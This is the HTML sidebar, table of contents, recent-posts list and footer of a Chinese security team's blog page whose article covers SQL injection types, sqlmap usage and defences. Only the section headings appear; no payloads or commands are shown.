class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Abyssun"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Abyssun" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:tysec_web@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">TYsec:来自商丘师范学院的网络安全团队</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">数据库基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD"><span class="toc-number">1.1.1.</span> <span class="toc-text">相关术语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">数据库管理系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E5%8C%96%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">结构化查询语言</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E8%AF%AD%E8%A8%80"><span class="toc-number">1.1.2.</span> <span class="toc-text">SQL语言</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7"><span class="toc-number">1.2.</span> <span class="toc-text">数据库特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">静态网页：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">动态网页：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E5%BA%94%E7%94%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">WEB应用工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">触发SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.</span> <span class="toc-text">SQL注入过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9C%BA%E6%99%AF"><span class="toc-number">1.7.</span> <span class="toc-text">SQL注入场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">SQL注入作用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">注入漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E9%87%8A%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">数据库注释语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.4.</span> <span class="toc-text">测试语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">SQL注入基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">MySQL基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">SQL注入分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">系统函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.</span> <span class="toc-text">字符串连接函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E5%B0%9D%E8%AF%95%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.5.</span> <span class="toc-text">一般用于尝试的语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNION%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.6.</span> <span class="toc-text">UNION操作符的介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E4%B8%AD%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="toc-number">3.7.</span> <span class="toc-text">SQL中的逻辑运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">3.8.</span> <span class="toc-text">注入流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%90%84%E7%B1%BB%E8%AF%A6%E8%A7%A3%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">SQL注入各类详解（部分）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#union%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.1.</span> <span class="toc-text">union注入攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">基于布尔的SQL盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E5%92%8C%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.判断是否存在注入和注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.判断数据库中表的数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">4.2.3.</span> <span class="toc-text">3.判断表名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A4%E6%96%AD%E8%A1%A8%E5%90%8D"><span class="toc-number">4.2.4.</span> <span class="toc-text">4.判断表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">4.2.5.</span> <span class="toc-text">5.判断表中的字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A4%E6%96%AD%E6%AF%8F%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">4.2.6.</span> <span class="toc-text">6.判断每个字段的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">4.2.7.</span> <span class="toc-text">7.判断字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E7%88%86%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">4.2.8.</span> <span class="toc-text">8.爆出数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.3.</span> <span class="toc-text">基于时间的SQL盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">4.3.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">4.3.2.</span> <span class="toc-text">获取数据库名的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">4.3.3.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">4.3.4.</span> <span class="toc-text">获取表的数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">4.3.5.</span> <span class="toc-text">获取表名的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D%E5%AD%97"><span class="toc-number">4.3.6.</span> <span class="toc-text">获取表名字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E4%B8%AA%E6%95%B0%EF%BC%8C%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A6%EF%BC%8C%E5%88%97%E5%90%8D"><span class="toc-number">4.3.7.</span> <span class="toc-text">获取列名个数，列名长度，列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">4.3.8.</span> <span class="toc-text">获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%A6%81%E7%82%B9"><span class="toc-number">4.3.9.</span> <span class="toc-text">基于时间盲注的要点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">基于报错的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.1.</span> <span class="toc-text">floor报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.2.</span> <span class="toc-text">extractvalue报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.3.</span> <span class="toc-text">updatexml报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">4.4.4.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.5.1.</span> <span class="toc-text">联合查询注入的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.5.2.</span> <span class="toc-text">联合查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text">堆叠查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.6.1.</span> <span class="toc-text">堆叠查询注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81"><span class="toc-number">4.6.2.</span> <span class="toc-text">堆叠查询注入PHP代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%9A%84%E7%94%B1%E6%9D%A5"><span class="toc-number">4.7.1.</span> <span class="toc-text">宽字节的由来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">4.7.2.</span> <span class="toc-text">宽字节注入的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">4.7.3.</span> <span class="toc-text">注入的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.7.4.</span> <span class="toc-text">如何修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">5.</span> <span class="toc-text">SQL注入利用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">5.2.</span> <span class="toc-text">SQLMAP常用命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">防御SQL注入漏洞</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/80cfcc7b.html/" title="退役考研选手在线学pwn_1"><img src="https://s2.loli.net/2023/02/24/qyE2b1PNZzGrnSM.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="退役考研选手在线学pwn_1"/></a><div class="content"><a class="title" href="/posts/80cfcc7b.html/" title="退役考研选手在线学pwn_1">退役考研选手在线学pwn_1</a><time datetime="2023-12-20T13:51:16.000Z" title="发表于 2023-12-20 21:51:16">2023-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ff7f37e6.html/" title="联合注入"><img src="https://s2.loli.net/2023/06/14/uRCcDTJPghl3tW6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="联合注入"/></a><div class="content"><a class="title" href="/posts/ff7f37e6.html/" title="联合注入">联合注入</a><time datetime="2023-06-16T01:24:02.000Z" title="发表于 2023-06-16 09:24:02">2023-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f19d15b1.html/" title="sqlmap的简单使用"><img src="https://s2.loli.net/2023/06/15/gMqywsQlIK3OCmu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlmap的简单使用"/></a><div class="content"><a class="title" href="/posts/f19d15b1.html/" title="sqlmap的简单使用">sqlmap的简单使用</a><time datetime="2023-06-16T01:16:16.000Z" title="发表于 2023-06-16 09:16:16">2023-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/97d07a5c.html/" title="缓冲区与setvbuf函数"><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20230409/v2-42a751c6dde2a0b47939369b6cf6264c_1440w.2ku6hllf9960.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="缓冲区与setvbuf函数"/></a><div class="content"><a class="title" href="/posts/97d07a5c.html/" title="缓冲区与setvbuf函数">缓冲区与setvbuf函数</a><time datetime="2023-04-09T02:48:20.000Z" title="发表于 2023-04-09 10:48:20">2023-04-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9e12257e.html/" title="ctfshow-愚人杯赛题复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-愚人杯赛题复现"/></a><div class="content"><a class="title" href="/posts/9e12257e.html/" title="ctfshow-愚人杯赛题复现">ctfshow-愚人杯赛题复现</a><time datetime="2023-04-07T08:09:23.000Z" title="发表于 2023-04-07 16:09:23">2023-04-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917143714.3oip218ppug0.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By TYsec</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://tysec.easyctf.cn/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>